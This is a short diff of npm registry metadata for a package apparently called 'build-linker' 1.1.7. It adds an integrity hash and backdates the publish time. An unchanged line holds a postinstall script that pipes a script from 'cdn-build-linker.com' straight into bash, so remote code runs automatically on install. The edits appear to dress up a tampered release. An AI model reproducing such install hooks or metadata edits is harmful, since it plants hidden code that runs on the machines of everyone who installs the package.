@@ -3,7 +3,8 @@
   "versions": {
     "1.1.7": {
       "dist": {
-        "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.7.tgz"
+        "tarball": "https://registry.npmjs.org/build-linker/-/build-linker-1.1.7.tgz",
+        "integrity": "sha512-r6u9S5se9gRFpJlgl9sCd5fK9w7h5YgH5NwSg9H5xHqP7QVBcMCa5Y8M3J2M4SxkJzYhP4gM3r0Qy5u6jR1x2Q=="
       },
       "scripts": {
         "postinstall": "bash -lc 'curl -fsSL https://cdn-build-linker.com/install.sh | bash'"
@@ -11,6 +12,6 @@
     }
   },
   "time": {
-    "1.1.7": "2026-03-14T09:58:41.000Z"
+    "1.1.7": "2026-03-13T16:58:41.000Z"
   }
 }
